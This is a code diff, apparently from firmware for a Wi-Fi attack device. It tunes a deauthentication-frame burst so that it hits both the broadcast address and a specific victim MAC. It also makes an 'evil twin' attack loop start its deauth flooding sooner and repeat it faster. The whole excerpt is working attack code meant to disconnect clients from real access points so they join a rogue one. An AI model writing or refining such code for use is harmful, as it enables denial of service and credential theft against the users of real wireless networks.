@@ -118,11 +118,11 @@ inline void sendDeauthFrame(const uint8_t* dst, const uint8_t* bssid, uint8_t re
 
 inline void sendDeauthBurst(const uint8_t* bssid) {
   static const uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-  const uint8_t* dst = g_victimFound ? g_victimMAC : bcast;
-  static const uint8_t reasons[] = { 0x01, 0x02, 0x03, 0x06, 0x07, 0x08 };
+  static const uint8_t reasons[] = { 0x07, 0x01, 0x07, 0x03, 0x06, 0x08 };
   for (int i = 0; i < cfg_deauth_burst; i++) {
     uint8_t reason = (cfg_deauth_reason > 0) ? (uint8_t)cfg_deauth_reason : reasons[i % 6];
-    sendDeauthFrame(dst, bssid, reason);
+    sendDeauthFrame(bcast, bssid, reason);
+    if (g_victimFound) sendDeauthFrame(g_victimMAC, bssid, reason);
   }
 }
 
@@ -495,8 +495,8 @@ inline void attackTask(void* param) {
         break;
       case ATK_EVIL_TWIN: {
         static unsigned long lastTx = 0;
-        if (millis() - evilTwinStartTime > 3000) {
-          if (WiFi.softAPgetStationNum() == 0 && millis() - lastTx > 20) {
+        if (millis() - evilTwinStartTime > 1000) {
+          if (WiFi.softAPgetStationNum() == 0 && millis() - lastTx > 15) {
             sendDeauthBurst(g_targetBSSID);
             lastTx = millis();
           }
